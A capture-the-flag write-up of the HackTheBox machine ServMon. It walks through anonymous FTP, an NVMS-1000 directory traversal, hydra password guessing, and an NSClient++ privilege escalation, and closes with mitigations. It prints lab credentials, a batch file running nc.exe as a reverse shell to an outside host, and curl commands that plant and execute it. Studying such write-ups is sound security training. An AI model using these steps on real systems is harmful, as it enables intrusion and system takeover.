# ServMon

![](images/info.PNG)

__Task__: Find [user.txt](#user-flag) and [root.txt](#root-flag)

### Penetration Methodologies

__Scanning__

- nmap

__Enumeration__

- FTP anonymous login

__Exploitation__

- NVMS-1000 directory traversal attack

- Weak password policy

__Priv Esc__

- NSClient++ privilege escalation exploit 

***

This is my guide to the HackTheBox Windows machine _ServMon_.

## User Flag

To start out, we'll run an `nmap` scan. The results seem to indicate that _ServMon_ is a Windows webserver. 

- __sC__: Enable common scripts

- __sV__: version and service on the port 

- __O__: remote OS detection using fingerprinting

```
# Nmap 7.80 scan initiated Wed Jun 24 21:14:11 2020 as: nmap -sC -sV -O -oA scan184 10.10.10.184
Nmap scan report for 10.10.10.184
Host is up (0.081s latency).
Not shown: 991 closed ports
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_01-18-20  12:05PM       <DIR>          Users
| ftp-syst: 
|_  SYST: Windows_NT
22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 b9:89:04:ae:b6:26:07:3f:61:89:75:cf:10:29:28:83 (RSA)
|   256 71:4e:6c:c0:d3:6e:57:4f:06:b8:95:3d:c7:75:57:53 (ECDSA)
|_  256 15:38:bd:75:06:71:67:7a:01:17:9c:5c:ed:4c:de:0e (ED25519)
80/tcp   open  http
| fingerprint-strings: 
|   GetRequest, HTTPOptions, RTSPRequest: 
|     HTTP/1.1 200 OK
|     Content-type: text/html
|     Content-Length: 340
|     Connection: close
|     AuthInfo: 
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
|     <html xmlns="http://www.w3.org/1999/xhtml">
|     <head>
|     <title></title>
|     <script type="text/javascript">
|     window.location.href = "Pages/login.htm";
|     </script>
|     </head>
|     <body>
|     </body>
|     </html>
|   NULL: 
|     HTTP/1.1 408 Request Timeout
|     Content-type: text/html
|     Content-Length: 0
|     Connection: close
|_    AuthInfo:
|_http-title: Site doesn't have a title (text/html).
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5666/tcp open  tcpwrapped
6699/tcp open  napster?
8443/tcp open  ssl/https-alt
| fingerprint-strings: 
|   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions: 
|     HTTP/1.1 404
|     Content-Length: 18
|     Document not found
|   GetRequest: 
|     HTTP/1.1 302
|     Content-Length: 0
|_    Location: /index.html
| http-title: NSClient++
|_Requested resource was /index.html
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2020-01-14T13:24:20
|_Not valid after:  2021-01-13T13:24:20
|_ssl-date: TLS randomness does not represent time
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============

[...]

TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=6/24%OT=21%CT=1%CU=32782%PV=Y%DS=2%DC=I%G=Y%TM=5EF4090
OS:0%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=108%TI=I%CI=I%II=I%SS=S%TS=
OS:U)OPS(O1=M54DNW8NNS%O2=M54DNW8NNS%O3=M54DNW8%O4=M54DNW8NNS%O5=M54DNW8NNS
OS:%O6=M54DNNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%
OS:DF=Y%T=80%W=FFFF%O=M54DNW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=
OS:0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S
OS:=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=
OS:Z)

Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 4m12s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-06-25T02:20:31
|_  start_date: N/A

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jun 24 21:16:32 2020 -- 1 IP address (1 host up) scanned in 141.75 seconds
```

Once we receive the results of the first scan, we'll perform a full one as well. On this box, it yields nothing. 

The first thing we see is that `nmap` indicates that anonymous login on FTP port 21 is enabled. This may yield some access to the file system. Let's attempt the username `anonymous` with no password. We connect succesfully!

![](images/ftp-login.png)

Only a few files are present but there is enough here to help enumerate the system a bit more. Within the `users` directory are two directories for users `nadine` and `nathan`. Additionally, each user has a file saved. With the `get` command, we retrieve a copy of each one.

```
ftp> cd Nadine
ftp> get Confidential.txt
ftp> cd ..
ftp> cd Nathan
ftp> get "Notes to do.txt"
````

The `Confidential.txt` contains some interesting information:

```
Nathan,

I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.

Regards

Nadine
```

It looks like if we can gain access to Nathan's desktop, we will find a file containing passwords. The `Notes to do.txt` also seems to indicate that user `nathan` has not removed the password file as requested. It may still be there. 

Okay, so with that, we've exhausted what is available within the FTP file share, let's return to our `nmap` scan results. Next, we'll navigate to the webpage. 

The box is hosting the service `NVMS-1000`, a management client for survellience devices. We don't have much in the way of credentials, but we'll just try a few basic combinations, to no avail.

![](images/nvms.png)

A quick google search reveals that this service is vulnerable to a [directory traversal attack](https://www.exploit-db.com/exploits/47774). Perfect! We know from earlier that a password file may still reside on Nathan's desktop. 

For this attack, we'll use `Burp Suite` to build my payload. First, we'll configure burp as our proxy, turn on intercept, and capture the GET request for the NVMS login page, the main page on _ServMon_. Next, we'll right-click and send that request to the repeater. We then change the path in the request to the directory traversal payload, and send it. Success! We now have arbitrary file access. 

Let's modify the payload with the specified path of the potential location of the password file. 

```
/Users/Nathan/Desktop/passwords.txt`
```

We receive a respond, with a list of passwords.

![](images/traversal.png)

We noted earlier that port 22 was open as well. We have some usernames and some passwords, so let's attempt connection through SSH first. Our lists are pretty short but for good practice, we'll use `hydra`.

```
hydra -l users.txt -P passwords.txt 10.10.10.184 ssh
```

One combination connects successfully, and we gain remote access as user `nadine`.

```
$ ssh nadine@10.10.10.184
password: L1k3B1gBut7s@W0rk
```

Let's grab the first flag from the user's desktop.

![](images/user-flag.png)

## Root Flag

Some quick enumeration as user `nadine` reveals little. Back stepping a bit, the `nmap` scan indicated that port 8443 was also open and running the service `NSClient`. In the browser, we'll navigate to `https://10.10.10.184:8443/`. 

![](images/nsclient.png)

`NSClient` requires just a password so we'll quickly attempt the ones from my previous list, but no luck. Searching online we find that NSClient is vulnerable to a [privilege escalation exploit](https://www.exploit-db.com/exploits/46802). 

The exploit states that the first step must be to find the webapp password with the `nsclient.ini` file. In our shell session, we can display the contents of the file and find the password. 

```
> type "\Program Files\NSClient++\nsclient.ini"
```

Additionally, we'll note that the only authorized host is `127.0.0.1` or `localhost`. 

```
; Undocumented key
password = ew2x6SsGTxjRwXOT

; Undocumented key
allowed hosts = 127.0.0.1
```

To bypass this restriction, let's make a tunnel using SSH and forward the port. [Linuxize](https://linuxize.com/post/how-to-setup-ssh-tunneling/) provides a great write-up on this topic. Reconnecting with the following command should allow us to login in successfully.

```
$ ssh -L 8443:127.0.0.1:8443 nadine@10.10.10.184
```

Next, we'll navigate to `https://127.0.0.1:8443/` and attempt to login. Success!

![](images/nsclient-main.png)

Unfortunately, the web application was too buggy and difficult to use without frustration, so I dug into the [documentation](https://docs.nsclient.org/api/rest/) for `NSClient` and decided to use `curl` commands to complete the exploit. 

The next step of the exploit requires a simple batch file for a reverse shell. Let's name it `evil.bat`.

```
@echo off
c:\temp\nc.exe 10.10.14.2 4444 -e cmd.exe
```

Next, we need to get my batch file and `nc.exe` onto _ServMon_. There a few different means to do that, but since we already have an SSH login, we'll use SCP, or secure copy.  

```
$ cp /usr/share/windows-resources/binaries/nc.exe .
$ scp nc.exe nadine@10.10.10.184:/Temp
$ scp evil.bat  nadine@10.10.10.184:/Temp
```

On Kali, we'll start an `netcat` listener.

```
$ nc -lvnp 4444
```

Using the documentation, we run the following command to [add a script](https://docs.nsclient.org/api/rest/scripts/#add-script) that will call our batch file.

```
$ curl -s -k -u admin -X PUT https://localhost:8443/api/v1/scripts/ext/scripts/evil.bat --data-binary @evil.bat
```

And finally, we will [execute the command](https://docs.nsclient.org/api/rest/queries/#command-execute) to run the script. 

```
$ curl -s -k -u admin https://localhost:8443/api/v1/queries/evil/commands/execute?time=3m
```

Our listener successfully connects, and we now have system shell.

![](images/root.png)

Let's capture the final flag on the Administrator's desktop.

![](images/root-flag.png)

***

### Mitigation

- Firstly, disable anonymous login on FTP. Very few services in an organization benefit from having guest or anonymous logins. In this instance, simply disabling this on FTP would severely limit severity of the directory traversal attack.

- Software, especially public-facing, should be patched quickly, especially when a critical vulnerability like a directory traversal attack exists. If the patch does not become available or the vendor stops support, an organization should consider using different software.

- Never store passwords in plaintext. 

- Previously mentioned methods of mitigation would've prevented an attacker from exploiting the privilege escalation vulnerability with `NSClient++`, as they would not have been able to forward ports nor have remote access to the file system. Regardless, layered security is key, and software patching still applies in this instance. 

### Final Thoughts

I really enjoyed the process to root this box. Unfortunately, the issues during the privilege escalation caused a lot of frustration, but I appreciate how it drove me to read the documentation and find a more stable route, even getting me to use a tool that I have little experience with. 

Additionally, I felt it was important to see the impact that directory traversal can have in conjunction with some file system enumeration.